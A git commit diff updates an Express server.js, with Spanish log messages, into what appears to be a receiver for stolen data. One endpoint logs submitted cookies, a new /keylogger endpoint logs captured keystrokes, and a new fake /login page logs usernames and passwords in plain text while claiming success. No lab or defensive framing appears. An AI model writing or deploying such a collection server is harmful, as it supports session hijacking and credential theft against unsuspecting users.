9a7ab29a99c4191d956836f5ad2ab32cb45cf5f4
Iván L. Alvarez <92383926+ivanlalvarez22@users.noreply.github.com>
2024-10-07 06:10:52 -0300

    Update server.js

--- server.js
+++ server.js
@@ -3,26 +3,53 @@ import dotenv from "dotenv";
 import express from "express";
 
 dotenv.config();
-
 const PORT = process.env.PORT || 8000;
 
 const app = express();
 
 app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true })); // Agregado para procesar datos del formulario
 
 app.get("/", (req, res) => {
-  res.send("Api is working");
+  res.send("Api is working!");
 });
 
 app.post("/cookie", (req, res) => {
   const { cookie } = req.body;
   console.log(`Cookie recibida: ${cookie}`);
   res.status(200).send({
-    status: "success",
+    status: "OK",
     code: 200,
     message: "Cookie recibida exitosamente",
   });
+});
+
+app.post("/keylogger", (req, res) => {
+  const { keyboardLogger } = req.body;
+  console.log(`Teclas registradas: ${keyboardLogger}`);
+  res.status(200).send({
+    status: "OK",
+    code: 200,
+    message: "Teclas registradas exitosamente",
+  });
+});
+
+app.get("/login", (req, res) => {
+  res.send(`
+    <form action="/login" method="post">
+      <input type="text" name="username" placeholder="Username">
+      <input type="password" name="password" placeholder="Password">
+      <input type="submit" value="Log in">
+    </form>
+  `);
+});
+
+app.post("/login", (req, res) => {
+  const { username, password } = req.body;
+  console.log(req.body)
+  console.log(`Username: ${username}, Password: ${password}`);
+  res.send("Login successful!");
 });
 
 app.listen(PORT, () => {
